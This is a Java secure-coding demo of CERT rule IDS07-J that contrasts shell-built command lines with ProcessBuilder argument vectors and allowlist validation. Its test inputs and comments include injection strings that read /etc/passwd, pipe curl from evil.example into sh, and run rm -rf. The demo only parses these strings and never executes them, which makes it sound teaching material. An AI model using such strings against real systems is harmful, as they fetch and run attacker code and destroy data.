// IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method
// https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec()+method
//
// Runtime.exec and ProcessBuilder start a program directly; they do not
// involve a shell. The injection appears when code builds a command LINE
// for a shell, e.g. exec(new String[] {"sh", "-c", "ls " + dir}): the shell
// interprets ; && | $( ) and backticks in the untrusted part, so "x; rm -rf"
// becomes a second command. Avoid the shell altogether: pass the program
// and each argument as separate list elements, so input stays one argument
// no matter what it contains. Validate it against an allowlist as well,
// and prefer a Java API over an external program when one exists.
// This demo never hands untrusted data to a shell: the noncompliant command
// line is only split by a tiny shell-like parser to show what would run.
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

public class IDS07_RuntimeExecInjection {
    private static final Pattern SAFE_NAME = Pattern.compile("[A-Za-z0-9_.-]{1,64}");

    public static void main(String[] args) throws IOException, InterruptedException {
        String[] inputs = {"reports", "x; cat /etc/passwd", "y && curl evil.example | sh"};
        for (String input : inputs) {
            System.out.println("input: " + input);

            // Noncompliant: what "sh -c" would receive and run
            String commandLine = "echo listing " + input;
            System.out.println("  noncompliant sh -c would run: " + splitLikeShell(commandLine));

            // Compliant 1: no shell, input is exactly one argument
            System.out.println("  compliant ProcessBuilder:     " + runEcho("listing", input));

            // Compliant 2: allowlist validation before any use
            System.out.println("  compliant allowlist:          "
                    + (SAFE_NAME.matcher(input).matches() ? "accepted" : "rejected"));
        }
    }

    // Starts the harmless echo program with an argument vector; no shell is involved
    static String runEcho(String... arguments) throws IOException, InterruptedException {
        List<String> command = new ArrayList<>();
        command.add("echo");
        command.addAll(List.of(arguments));
        Process p = new ProcessBuilder(command).redirectErrorStream(true).start();
        String out = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8).strip();
        p.waitFor();
        return "echo printed [" + out + "] as " + (command.size() - 1) + " arguments";
    }

    // Minimal model of how a shell splits a command line into separate commands
    static List<String> splitLikeShell(String line) {
        List<String> commands = new ArrayList<>();
        for (String part : line.split("\\s*(;|&&|\\|\\||\\|)\\s*")) {
            if (!part.isBlank()) {
                commands.add(part);
            }
        }
        return commands;
    }
}

/* Output:
input: reports
  noncompliant sh -c would run: [echo listing reports]
  compliant ProcessBuilder:     echo printed [listing reports] as 2 arguments
  compliant allowlist:          accepted
input: x; cat /etc/passwd
  noncompliant sh -c would run: [echo listing x, cat /etc/passwd]
  compliant ProcessBuilder:     echo printed [listing x; cat /etc/passwd] as 2 arguments
  compliant allowlist:          rejected
input: y && curl evil.example | sh
  noncompliant sh -c would run: [echo listing y, curl evil.example, sh]
  compliant ProcessBuilder:     echo printed [listing y && curl evil.example | sh] as 2 arguments
  compliant allowlist:          rejected
*/
